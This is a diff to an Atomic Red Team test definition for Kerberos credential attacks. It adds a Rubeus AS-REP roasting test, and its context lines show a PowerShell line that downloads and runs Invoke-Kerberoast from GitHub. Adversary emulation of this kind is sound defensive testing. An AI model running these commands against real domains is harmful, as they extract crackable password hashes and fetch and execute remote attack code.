@@ -17,4 +17,40 @@ atomic_tests:
       iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1)
       Invoke-Kerberoast | fl
     name: powershell
-
+- name: Rubeus AS-REP Roast
+  description: |
+    Uses the Rubeus tool to attack domain accounts that do not have kerberos pre-auth enabled. 
+    If a domain user does not have Kerberos preauthentication enabled, an AS-REP can be successfully 
+    requested for the user, and a component of the structure can be cracked offline a la kerberoasting.
+    Binaries for various .net versions (3.5, 4, 4.5) can be foud in the bin folder of this technique
+    Reference: https://github.com/GhostPack/Rubeus#asreproast
+  supported_platforms:
+  - windows
+  input_arguments:
+    file_name:
+      description: Rubeus executable
+      type: Path
+      default: rubeus4.exe
+    file_path:
+      description: local path to rubeus4.exe
+      type: Path
+      default: PathToAtomicsFolder\T1558.003\bin\
+    out_file:
+      description: file to store command output
+      type: Path
+      default: '%temp%\asreproast-output.txt'
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      #{file_path}\#{file_name} must be present
+    prereq_command: |
+      if (Test-Path #{file_path}\#{file_name}) {exit 0} else {exit 1}
+    get_prereq_command: |
+      New-Item -Type Directory #{file_path} -ErrorAction ignore | Out-Null
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1558.003/bin/#{file_name}" -OutFile "#{file_path}\#{file_name}"
+  executor:
+    command: |
+      #{file_path}\#{file_name} asreproast /outfile:#{out_file}
+    cleanup_command: |
+      del "#{out_file}" >nul 2>&1
+    name: command_prompt
